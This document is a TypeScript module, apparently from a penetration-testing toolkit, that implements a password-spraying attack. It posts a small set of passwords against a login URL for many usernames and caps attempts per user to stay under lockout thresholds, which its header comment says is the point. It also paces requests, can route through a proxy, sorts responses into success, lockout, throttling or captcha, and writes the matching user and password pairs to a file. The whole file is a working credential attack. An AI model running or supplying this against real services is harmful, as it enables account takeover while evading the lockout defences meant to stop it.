import { fetchUrl } from "../adapters/http.js";
import { writeArtifact } from "../adapters/artifacts.js";

/** Lockout-aware password spray: few passwords across many users instead of
 *  many passwords against one user. Per-user attempt cap, global delay and a
 *  stop-on-lockout per user. Hits classify like cred-brute; the budget is the
 *  point — 3 attempts × 500 users survives a 5-strike policy. */

export interface SprayInput {
  readonly url: string;
  readonly bodyTemplate: string;
  readonly users: readonly string[];
  readonly passwords: readonly string[];
  readonly outputRoot: string;
  /** Attempts per user before moving on (default 3). */
  readonly maxPerUser?: number;
  readonly delayMs?: number;
  readonly proxy?: string;
  readonly timeoutMs?: number;
  readonly contentType?: string;
  readonly headers?: Record<string, string>;
}

export type SprayClass = "ok" | "bad-cred" | "locked" | "throttled" | "captcha" | "error";

export interface SprayHit {
  readonly user: string;
  readonly password: string;
  readonly status: number;
  readonly classification: SprayClass;
  readonly evidence: string;
}

export interface SprayResult {
  readonly tried: number;
  readonly hits: SprayHit[];
  readonly lockedUsers: readonly string[];
  readonly throttled: boolean;
  readonly artifacts: { path: string; bytes: number }[];
}

const OK_HINT = /(logout|dashboard|welcome|signed in|token|access_token|"ok"\s*:\s*true)/i;
const BAD_HINT = /(invalid|incorrect|wrong|failed|bad credentials|unauthorized)/i;
const LOCK_HINT = /(locked|too many (?:attempts|failures)|temporarily (?:locked|blocked))/i;
const THROTTLE = /(429|too many requests|rate limit)/i;
const CAPTCHA = /(captcha|recaptcha|hcaptcha|turnstile|challenge)/i;

const classify = (input: SprayInput, status: number, headers: Record<string, string>, body: string): SprayClass => {
  if (input.bodyTemplate.trim().startsWith("{") && status >= 200 && status < 300) {
    try { const d = JSON.parse(body) as Record<string, unknown>; if (d.token || d.access_token || d.accessToken || d.jwt) return "ok"; } catch { /* html */ }
  }
  if (LOCK_HINT.test(body)) return "locked";
  if (THROTTLE.test(`${status} ${body} ${headers["retry-after"] ?? ""}`)) return "throttled";
  if (CAPTCHA.test(body)) return "captcha";
  if (status === 200 && (OK_HINT.test(body) || !BAD_HINT.test(body))) return "ok";
  if (status === 302 && !BAD_HINT.test(body)) return "ok";
  return "bad-cred";
};

const sleep = (ms: number): Promise<void> => new Promise((r) => setTimeout(r, ms));

export const sprayPasswords = async (input: SprayInput): Promise<SprayResult> => {
  const ct = input.contentType ?? (input.bodyTemplate.trim().startsWith("{") ? "application/json" : "application/x-www-form-urlencoded");
  const headers = (): Record<string, string> => ({ "content-type": ct, ...(input.headers ?? {}) });
  const isJson = ct.includes("json");
  const enc = (v: string): string => (isJson ? v : encodeURIComponent(v));
  const perUser = Math.max(1, input.maxPerUser ?? 3);
  const delay = Math.max(0, input.delayMs ?? 250);
  const hits: SprayHit[] = [];
  const lockedUsers: string[] = [];
  let tried = 0;
  let throttled = false;

  for (const user of input.users) {
    if (throttled) break;
    let attempts = 0;
    for (const pass of input.passwords) {
      if (attempts >= perUser) break;
      const body = input.bodyTemplate.replaceAll("{USER}", enc(user)).replaceAll("{EMAIL}", enc(user)).replaceAll("{PASS}", enc(pass));
      const r = await fetchUrl(input.url, { method: "POST", body, headers: headers(), maxAttempts: 1, redirect: "manual", proxy: input.proxy, timeoutMs: input.timeoutMs ?? 10_000, maxBytes: 256 * 1024 });
      attempts++;
      tried++;
      const cls = classify(input, r.status, r.headers, r.body);
      const evidence = r.body.slice(0, 140).replace(/\s+/g, " ");
      if (cls === "ok") { hits.push({ user, password: pass, status: r.status, classification: cls, evidence }); break; }
      if (cls === "locked") { lockedUsers.push(user); hits.push({ user, password: pass, status: r.status, classification: cls, evidence }); break; }
      if (cls === "throttled") { throttled = true; hits.push({ user, password: pass, status: r.status, classification: cls, evidence }); break; }
      if (cls === "captcha") { hits.push({ user, password: pass, status: r.status, classification: cls, evidence }); break; }
      await sleep(delay);
    }
  }

  const body = JSON.stringify({ tried, hits, lockedUsers, throttled }, null, 2);
  const artifact = await writeArtifact(input.outputRoot, "spray.json", body);
  return { tried, hits, lockedUsers, throttled, artifacts: [artifact] };
};
